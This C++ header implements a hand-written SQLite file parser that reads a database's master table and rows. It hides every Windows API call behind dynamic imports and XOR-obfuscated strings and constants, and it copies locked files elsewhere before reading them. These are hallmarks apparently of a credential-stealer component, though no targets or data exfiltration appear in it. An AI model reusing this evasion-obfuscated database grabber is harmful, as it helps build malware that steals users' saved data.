#pragma once
#include <string>
#include <vector>

#include "xor.h"
#include "DynImport.h"
#include "file.h"

#define XOR(x) XorStr(x)

using std::string;
using std::vector;

typedef unsigned char byte;

#define ROUND(x) (((x) & 1) ? ((x + 1) / 2) : ((x) / 2))

class SqlHandler
{
	struct RecordHeaderField
	{
		long Size;
		long Type;
	};

	struct TableEntry
	{
		vector<string> Content;
	};

	struct SqliteMasterEntry
	{
		string ItemName;
		long RootNum;
		string SqlStatement;
	};

	bool ReadAllBytes(vector<byte> & bytes, const string& fileName, const string & path)
	{
		try
		{
			HANDLE hFile = FNC(CreateFileA, XOR("Kernel32.dll"))(fileName.c_str(), XorInt(GENERIC_READ), 
				XorInt(FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE), 0,
				XorInt(OPEN_EXISTING), XorInt(FILE_ATTRIBUTE_NORMAL), 0);
			if (hFile == INVALID_HANDLE_VALUE && !path.empty())
			{
				file().Copy(fileName, path);
				hFile = FNC(CreateFileA, XOR("Kernel32.dll"))(path.c_str(), XorInt(GENERIC_READ),
					XorInt(FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE), 0,
					XorInt(OPEN_EXISTING), XorInt(FILE_ATTRIBUTE_NORMAL), 0);
			}

			if (hFile != INVALID_HANDLE_VALUE)
			{
				DWORD dwSize = FNC(GetFileSize, XOR("Kernel32.dll"))(hFile, 0);
				char* buff = new char[dwSize];
				DWORD dwBytes;
				FNC(ReadFile, XOR("Kernel32.dll"))(hFile, buff, dwSize, &dwBytes, 0);
				FNC(CloseHandle, XOR("Kernel32.dll"))(hFile);
				for (DWORD i = 0; i < dwSize; ++i)
					bytes.push_back(buff[i]);
				delete[] buff;
			}

			return true;
		}
		catch (...) { return false; }
	}

	unsigned long long ConvertToULong(unsigned int startIndex, unsigned int size)
	{
		try
		{
			if (size > 8 || size == 0)
				return 0;
			if (startIndex + size >= _fileBytes.size())
			{
				bSuccess = false;
				return 0;
			}
			
			unsigned long long num = 0;
			for (unsigned int index = 0; index < size; ++index)	
				num = (num << 8) | (unsigned long long)_fileBytes[startIndex + index];			
			return num;
		}
		catch (...) { return 0; }
	}

	long BitConverter_ToInt64(byte* vec)
	{
		try
		{
			long result = 0;
			for (int n = 7; n >= 0; --n)
				result = (result << 8) + vec[n];
			return result; // BitConverter.ToInt64 custom
		}
		catch (...) { return 0; }
	}

	int Gvl(int startIdx)
	{
		try
		{
			if (startIdx > _fileBytes.size())
				return 0;
			for (int index = startIdx; index <= startIdx + 8; ++index)
			{
				if (index > _fileBytes.size() - 1)
					return 0;
				if (((int)_fileBytes[index] & 128) != 128)
					return index;
			}
			return startIdx + 8;
		}
		catch (...) { return 0; }
	}

	long Cvl(int startIdx, int endIdx)
	{
		try
		{
			++endIdx;
			byte numArray[8] = { 0, 0, 0, 0, 0, 0, 0, 0 };
			int num1 = endIdx - startIdx;
			bool flag = false;
			if (num1 == 0 | num1 > 9)
				return 0;
			if (num1 == 1)
			{
				numArray[0] = (byte)((unsigned int)_fileBytes[startIdx] & (unsigned int)127);
				return BitConverter_ToInt64(numArray); // BitConverter.ToInt64 custom
			}
			else if (num1 == 9)
				flag = true;

			int num2 = 1;
			int num3 = 7;
			int index1 = 0;
			if (flag)
			{
				numArray[0] = _fileBytes[endIdx - 1];
				--endIdx;
				index1 = 1;
			}
			int index2 = endIdx - 1;
			while (index2 >= startIdx)
			{
				if (index2 - 1 >= startIdx)
				{
					numArray[index1] = (byte)((int)_fileBytes[index2] >> num2 - 1 & (int)255 >> num2 | (int)_fileBytes[index2 - 1] << num3);
					++num2;
					++index1;
					--num3;
				}
				else if (!flag)
					numArray[index1] = (byte)((int)_fileBytes[index2] >> num2 - 1 & (int)255 >> num2);
				--index2;
			}

			return BitConverter_ToInt64(numArray); //BitConverter_ToInt64(numArray, 0);
		}
		catch (...) { return 0; }
	}

	bool IsOdd(long value)
	{
		return (value & 1L) == 1L;
	}

	string GetString(unsigned int index, unsigned int count)
	{
		try
		{
			string res = "";
			if (index >= _fileBytes.size() || index + count >= _fileBytes.size())
				return "";
			const unsigned int old_index = index;
			for (; index < old_index + count; ++index)
				res += _fileBytes[index];

			return res;
		}
		catch (...) { return ""; }
	}

	vector<string> split(const string & what, char ch)
	{
		try
		{
			string temp;
			vector<string> res;
			for (int i = 0; i < what.size(); ++i)
			{
				if (what[i] != ch)
					temp += what[i];
				else
				{
					res.push_back(temp);
					temp = "";
				}
			}
			if (temp != "")
				res.push_back(temp);
			return res;
		}
		catch (...) { return vector<string>(); }
	}

	bool Compare(const string& str1, const string& str2)
	{
		try
		{
			if (str1.size() != str2.size())
				return false;
			for (int i = 0; i < str1.size(); ++i)
			{
				if (tolower(str1[i]) != tolower(str2[i]))
					return false;
			}
			return true;
		}
		catch (...) { return false; }
	}

	string TrimStart(const string& str)
	{
		try
		{
			string res = "";
			for (int i = 0; i < str.size(); ++i)
			{
				if (str[i] != ' ')
				{
					res = str.substr(i);
					break;
				}
			}
			return res;
		}
		catch (...) { return ""; }
	}

	bool ReadMasterTable(long offset)
	{
		try
		{
			if (_fileBytes.size() <= offset)
				return false;

			if (_fileBytes[offset] == 5)
			{
				long long num1 = ConvertToULong((int)offset + 3, 2) - 1UL;
				//if (num1 == 65535)
					//return false;
				for (int index = 0; index <= num1; ++index)
				{
					unsigned long long num2 = ConvertToULong((int)offset + 12 + index * 2, 2);
					long new_offset = ((long)ConvertToULong((int)num2, 4) - 1L) * (long)_pageSize;
					if (new_offset < _fileBytes.size())
						ReadMasterTable(new_offset);
				}
				long new_offset2 = ((long)ConvertToULong((int)offset + 8, 4) - 1L) * (long)_pageSize;
				if (new_offset2 < _fileBytes.size())
					ReadMasterTable(new_offset2);
			}
			else if (_fileBytes[offset] == 13)
			{
				unsigned long num3 = ConvertToULong((int)offset + 3, 2) - 1UL;
				int num4 = 0;
				if (!_masterTableEntries.empty())
				{
					num4 = _masterTableEntries.size();
					_masterTableEntries.resize(_masterTableEntries.size() + (int)num3 + 1);
				}
				else
				{
					if(!_masterTableEntries.empty())
						_masterTableEntries.clear();
					_masterTableEntries.resize((unsigned long)(num3 + 1L));
				}

				for (unsigned long index1 = 0; index1 <= num3; ++index1)
				{
					unsigned long long num2 = ConvertToULong((int)offset + 8 + (int)index1 * 2, 2);
					if (offset != 100L)
						num2 += (unsigned long)offset;

					int endIdx1 = Gvl((int)num2);
					int endIdx2 = Gvl((int)((long)num2 + ((long)endIdx1 - (long)num2) + 1L));

					unsigned long num5 = num2 + (endIdx2 - num2 + 1L);
					int endIdx3 = Gvl(num5);
					int endIdx4 = endIdx3;
					long num6 = Cvl(num5, endIdx3);
					long numArray[5] = { 0, 0, 0, 0, 0 };
					for (int index2 = 0; index2 <= 4; ++index2)
					{
						int startIdx = endIdx4 + 1;
						endIdx4 = Gvl(startIdx);
						numArray[index2] = Cvl(startIdx, endIdx4);
						if (numArray[index2] > 9L)
						{
							if (IsOdd(numArray[index2]))
								numArray[index2] = ROUND(numArray[index2] - 13L);
							else
								numArray[index2] = ROUND(numArray[index2] - 12L);
						}
						else
							numArray[index2] = _sqlDataTypeSize[numArray[index2]];
					}

					_masterTableEntries[num4 + index1].ItemName = GetString(num5 + num6 + numArray[0], numArray[1]);
					_masterTableEntries[num4 + index1].RootNum = ConvertToULong(num5 + num6 + numArray[0] + numArray[1] + numArray[2], numArray[3]);
					_masterTableEntries[num4 + index1].SqlStatement = GetString(num5 + num6 + numArray[0] + numArray[1] + numArray[2] + numArray[3], numArray[4]);
				}
			}

			return true;
		}
		catch (...) { return false; }
	}

	bool ReadTableFromOffset(unsigned long long offset)
	{
		try
		{
			if (!bSuccess)
				return false;
			if (_fileBytes[offset] == 13)
			{
				int num1 = (int)(ConvertToULong((int)offset + 3, 2) - 1UL);
				int num2 = 0;
				if (!_tableEntries.empty())
				{
					num2 = _tableEntries.size();
					_tableEntries.resize(_tableEntries.size() + (int)num1 + 1);
				}
				else
				{
					if(!_tableEntries.empty())
						_tableEntries.clear();
					_tableEntries.resize((int)num1 + 1);
				}

				for (int index1 = 0; index1 <= (int)num1; ++index1)
				{
					unsigned long long num3 = ConvertToULong((int)offset + 8 + (int)index1 * 2, 2);
					if ((long)offset != 100L)
						num3 += offset;
					int endIdx1 = Gvl((int)num3);
					int endIdx2 = Gvl((int)((long)num3 + ((long)endIdx1 - (long)num3) + 1L));
					unsigned long num4 = num3 + (unsigned long)((long)endIdx2 - (long)num3 + 1L);
					int endIdx3 = Gvl((int)num4);
					int endIdx4 = endIdx3;
					long num5 = Cvl((int)num4, endIdx3);
					vector<RecordHeaderField> _fieldArr;
					long num6 = (long)num4 - (long)endIdx3 + 1L;
					int index2 = 0;
					while (num6 < num5)
					{
						_fieldArr.resize(index2 + 1);
						int startIdx = endIdx4 + 1;
						endIdx4 = Gvl(startIdx);
						_fieldArr[index2].Type = Cvl(startIdx, endIdx4);
						if (_fieldArr[index2].Type < 0L)
							return false;
						if (_fieldArr[index2].Type > 9L)
						{
							if (IsOdd(_fieldArr[index2].Type))
								_fieldArr[index2].Size = ROUND(_fieldArr[index2].Type - 13L);
							else
								_fieldArr[index2].Size = ROUND(_fieldArr[index2].Type - 12L);
						}
						else
							_fieldArr[index2].Size = _sqlDataTypeSize[_fieldArr[index2].Type];

						num6 = num6 + (long)(endIdx4 - startIdx) + 1L;
						++index2;
					}

					if (!_fieldArr.empty())
					{
						_tableEntries[num2 + index1].Content.clear();
						_tableEntries[num2 + index1].Content.resize(_fieldArr.size());
						int num7 = 0;
						for (int index3 = 0; index3 < _fieldArr.size(); ++index3)
						{
							if (!bSuccess)
								return false;
							if (_fieldArr[index3].Type > 9L)
								_tableEntries[num2 + index1].Content[index3] = GetString(num4 + num5 + num7, _fieldArr[index3].Size);
							else
								_tableEntries[num2 + index1].Content[index3] = std::to_string(ConvertToULong(num4 + num5 + num7, _fieldArr[index3].Size));
							num7 += _fieldArr[index3].Size;
						}
					}
				}
			}
			else if (_fileBytes[offset] == 5)
			{
				unsigned num1 = (unsigned short)(ConvertToULong((int)((long)offset + 3L), 2) - 1UL);
				for (unsigned short index = 0; (int)index <= (int)num1; ++index)
				{
					unsigned short num2 = (unsigned short)ConvertToULong((int)offset + 12 + (int)index * 2, 2);
					ReadTableFromOffset((ConvertToULong((int)((long)offset + (long)num2), 4) - 1UL) * _pageSize);
				}
				ReadTableFromOffset((ConvertToULong((int)((long)offset + 8L), 4) - 1UL) * _pageSize);
			}

			return true;
		}
		catch (...) { return false; }
	}

	byte _sqlDataTypeSize[10] = { 0, 1, 2, 3, 4, 6, 8, 8, 0, 0 };
	unsigned long _dbEncoding;
	vector<byte> _fileBytes;
	unsigned long _pageSize;
	vector<string> _fieldNames;
	vector<SqliteMasterEntry> _masterTableEntries;
	vector<TableEntry> _tableEntries;
	bool bSuccess;
public:
	SqlHandler(const string& fileName, bool& success, const string & path = "")
	{
		bSuccess = true;
		if (ReadAllBytes(_fileBytes, fileName, path))
		{
			success = true;
			_pageSize = ConvertToULong(16, 2);
			_dbEncoding = ConvertToULong(56, 4);
			success = ReadMasterTable(100L);
		}
	}

	bool ReadTable(const string& tableName)
	{
		try
		{
			if (!_tableEntries.empty())
				_tableEntries.clear();
			int index1 = -1;
			for (int index2 = 0; index2 < _masterTableEntries.size(); ++index2)
			{
				if (Compare(_masterTableEntries[index2].ItemName, tableName))
				{
					index1 = index2;
					break;
				}
			}

			if (index1 == -1)
				return false;

			vector<string> strArray = 
				split(_masterTableEntries[index1].SqlStatement.substr(_masterTableEntries[index1].SqlStatement.find('(') + 1), ',');
			for (int index2 = 0; index2 < strArray.size(); ++index2)
			{
				strArray[index2] = TrimStart(strArray[index2]);
				int length = strArray[index2].find(' ');
				if (length > 0)
					strArray[index2] = strArray[index2].substr(0, length);
				if (strArray[index2].find(XorStr("UNIQUE")) != string::npos)
				{
					_fieldNames.resize(index2 + 1);
					_fieldNames[index2] = strArray[index2];
				}
			}
			bool b = ReadTableFromOffset((unsigned long)(_masterTableEntries[index1].RootNum - 1L) * _pageSize);
			_tableEntries.shrink_to_fit();
			_masterTableEntries.shrink_to_fit();
			_fieldNames.shrink_to_fit();
			return (_tableEntries.size() == 65535) ? false : b;
		}
		catch (...) { return false; }
	}

	string GetValue(unsigned int rowNum, unsigned int field)
	{
		try
		{
			if (_tableEntries.size() == 0 || rowNum >= _tableEntries.size())
				return "";

			return field >= _tableEntries[rowNum].Content.size() ? "" : _tableEntries[rowNum].Content[field];
		}
		catch (...) { return ""; }
	}

	int GetRowCount()
	{
		return _tableEntries.size();
	}
};